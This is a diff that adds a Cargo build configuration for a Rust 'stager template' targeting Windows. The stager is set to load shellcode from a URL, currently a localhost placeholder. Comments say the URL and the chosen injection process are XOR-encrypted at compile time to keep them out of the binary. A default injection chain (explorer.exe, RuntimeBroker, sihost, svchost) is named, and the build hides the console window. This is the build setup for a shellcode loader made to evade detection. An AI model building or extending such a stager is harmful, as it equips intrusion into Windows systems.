@@ -1,0 +1,29 @@
+# Build settings of the stager template. The generator rewrites only `target` and `RG_TARGET`.
+
+[build]
+target = "x86_64-pc-windows-msvc"
+
+[env]
+# Path (local mode) or URL (url mode) to the shellcode. Unused in embed mode.
+# build.rs XOR-encrypts this at compile time; no plaintext appears in the binary.
+RG_TARGET = 'http://127.0.0.1:80/shellcode.bin'
+# Optional: inject into this single process instead of the default fallback chain.
+# build.rs XOR-encrypts this at compile time; no plaintext name appears in the binary.
+# Leave empty to use the default chain (explorer.exe -> RuntimeBroker -> sihost -> svchost).
+INJECT_PROC = ''
+
+# No MSVC / Windows SDK needed: link with the rust-lld shipped by rustup, without any CRT.
+[target.'cfg(all(target_os = "windows", target_env = "msvc"))']
+rustflags = [
+    "-C", "linker=rust-lld",
+    "-C", "linker-flavor=lld-link",
+    "-C", "link-arg=/NODEFAULTLIB",
+    "-C", "link-arg=/ENTRY:entry",
+    "-C", "link-arg=/SUBSYSTEM:WINDOWS",   # no console window
+    "-C", "link-arg=/DEBUG:NONE",
+    # Size: fold read-only data and unwind table into .text.
+    "-C", "link-arg=/MERGE:.rdata=.text",
+    "-C", "link-arg=/MERGE:.pdata=.text",
+    # Deterministic output: zero timestamp.
+    "-C", "link-arg=/TIMESTAMP:0",
+]
